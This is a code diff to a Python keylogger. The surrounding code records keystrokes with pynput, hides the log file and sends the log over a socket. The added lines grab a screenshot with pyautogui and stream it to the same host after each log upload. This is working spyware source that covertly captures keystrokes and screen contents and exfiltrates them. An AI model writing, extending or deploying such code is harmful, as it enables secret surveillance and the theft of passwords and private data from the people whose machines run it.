@@ -1,4 +1,4 @@
-import socket, logging, datetime, time, os, ctypes, io, platform
+import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui
 from pynput.keyboard import Key, Listener
 
 
@@ -50,6 +50,24 @@ def send_log_file(filename, host, port, last_position):
         print('Server unreachable ! The log file will be sent later')
         return last_position
 
+# Function to take a screenshot
+def take_screenshot(host, port):
+    try:
+        with socket.create_connection((host, port)) as sock:
+            filename = datetime.datetime.today().strftime('%Hh%Mm%Ss.png')
+            filename_size = len(filename)
+            sock.send(filename_size.to_bytes(4, 'big'))
+            sock.send(filename.encode())
+            img = pyautogui.screenshot()
+            img_bytes = io.BytesIO()
+            img.save(img_bytes, format='PNG')
+            img_bytes = img_bytes.getvalue()
+            sock.sendall(img_bytes)
+        print(f"Screenshot sent")
+    except socket.error:
+        print('Server unreachable ! The screenshot will be sent later')
+
+
 # Function to start the listener
 def start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time):
     with Listener(on_press=listen_keyboard) as listener:
@@ -58,6 +76,7 @@ def start_listener(filename, host, port, capture_duration, delay_send_log, last_
                 time.sleep(delay_send_log)
                 listener.stop()
                 last_position = send_log_file(filename, host, port, last_position)
+                take_screenshot(host, port)
                 listener = Listener(on_press=listen_keyboard)
                 listener.start()
         except KeyboardInterrupt:
@@ -66,9 +85,9 @@ def start_listener(filename, host, port, capture_duration, delay_send_log, last_
 def main():
     host = 'localhost'
     port = 9809
-    current_time = datetime.datetime.today().strftime('%Y-%m-%d %Hh')
+    current_time = datetime.datetime.today().strftime('%d-%m-%Y %Hh')
     ip = str(socket.gethostbyname(socket.gethostname()))
-    filename = f'{ip} - {current_time} - keyboard.txt'
+    filename = f'{ip}_{current_time}_keyboard.txt'
     setup_logging_file(filename)
     hide_file(filename)
     last_position = 0
